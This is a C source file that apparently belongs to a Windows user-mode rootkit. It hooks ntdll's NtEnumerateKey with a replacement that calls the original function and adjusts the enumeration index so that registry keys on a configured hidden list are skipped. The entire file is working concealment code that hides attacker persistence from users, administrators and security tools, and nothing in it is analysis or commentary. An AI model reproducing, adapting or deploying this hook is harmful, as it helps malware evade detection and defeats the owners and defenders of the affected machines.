#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "ntenumeratekey.h"

/* Return the name of the specified registrykey entry. */

PVOID getKeyEntryName(PVOID KeyInformation,KEY_INFORMATION_CLASS KeyInformationClass)
{
	PVOID pvResult=NULL;

	switch(KeyInformationClass)
	{
		case KeyBasicInformation:
			pvResult=(PVOID)&((PKEY_BASIC_INFORMATION)KeyInformation)->Name;
			break;
		case KeyNodeInformation:
			pvResult=(PVOID)&((PKEY_NODE_INFORMATION)KeyInformation)->Name;
			break;
	}

	return pvResult;
}

/* Return the length of the name of the specified registrykey entry. */
	
ULONG getKeyEntryNameLength(PVOID KeyInformation,KEY_INFORMATION_CLASS KeyInformationClass)
{
	ULONG ulResult=0;

	switch(KeyInformationClass)
	{
		case KeyBasicInformation:
			ulResult=((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
			break;
		case KeyNodeInformation:
			ulResult=((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
			break;
	}

	return ulResult;
}

// ntdll.NtEnumerateKey
NTSTATUS WINAPI NewNtEnumerateKey(
  HANDLE KeyHandle,
  ULONG Index,
  KEY_INFORMATION_CLASS KeyInformationClass,
  PVOID KeyInformation,
  ULONG Length,
  PULONG ResultLength
)
{
	NTSTATUS rc;
	ULONG Shift=0;

	if (KeyInformationClass==KeyBasicInformation || 
		KeyInformationClass==KeyNodeInformation)
	{
		OBJECT_ATTRIBUTES ObjectAttributes;
		UNICODE_STRING dbg,usKey;
		ANSI_STRING asKey;
		ULONG tmpIndex,i=0;
		BOOL bFound=FALSE;
		HANDLE hTmp;

		// call original function
		rc=OldNtEnumerateKey(
			KeyHandle,
			Index,
			KeyInformationClass,
			KeyInformation,
			Length,
			ResultLength
			);

		if (NT_SUCCESS(rc))
		{
			dbg.Buffer=getKeyEntryName(KeyInformation,KeyInformationClass);
			dbg.Length=(USHORT)getKeyEntryNameLength(KeyInformation,KeyInformationClass);

			while(config_GetOneStringW(ConfigHiddenRegKey,i,&usKey))
			{
				if (RtlCompareUnicodeString(&usKey,&dbg,TRUE)<=0)
				{	
					InitializeObjectAttributes(&ObjectAttributes,&usKey,0,KeyHandle,NULL);
					if (NtOpenKey(&hTmp,GENERIC_READ,&ObjectAttributes)==STATUS_SUCCESS)
					{
						Shift++;
						NtClose(hTmp);
					}
				}
				
				i++; // next hidden key
			}

			if (Shift)
			{
				ULONG Shoft=Shift;
				tmpIndex=Index+1;
				do
				{	// check how many keys there are before our shifted key
					Shoft--;
					rc=OldNtEnumerateKey(
							KeyHandle,
							tmpIndex++,
							KeyInformationClass,
							KeyInformation,
							Length,
							ResultLength
							);
	
					if (rc!=STATUS_SUCCESS)
						return(rc);
			
					dbg.Buffer=getKeyEntryName(KeyInformation,KeyInformationClass);
					dbg.Length=(USHORT)getKeyEntryNameLength(KeyInformation,KeyInformationClass);
					RtlUnicodeStringToAnsiString(&asKey,&dbg,TRUE);
					bFound=config_CheckString(ConfigHiddenRegKey,asKey.Buffer,asKey.Length);
					if (bFound) 
							Shift++;
					RtlFreeAnsiString(&asKey);
				}
				while (Shoft>0);
				
				tmpIndex=Index+Shift;
				do
				{	// check if final key should be hidden
					rc=OldNtEnumerateKey(
							KeyHandle,
							tmpIndex++,
							KeyInformationClass,
							KeyInformation,
							Length,
							ResultLength
							);
		
					if (rc!=STATUS_SUCCESS)
						return(rc);
			
					dbg.Buffer=getKeyEntryName(KeyInformation,KeyInformationClass);
					dbg.Length=(USHORT)getKeyEntryNameLength(KeyInformation,KeyInformationClass);
					RtlUnicodeStringToAnsiString(&asKey,&dbg,TRUE);
					bFound=config_CheckString(ConfigHiddenRegKey,asKey.Buffer,asKey.Length);
					if (bFound) 
							Shift++;
					RtlFreeAnsiString(&asKey);
				}
				while (bFound);
			}
		}
	}

	// call original function
	rc=OldNtEnumerateKey(
			KeyHandle,
			Index+Shift,
			KeyInformationClass,
			KeyInformation,
			Length,
			ResultLength
			);

	return rc;
}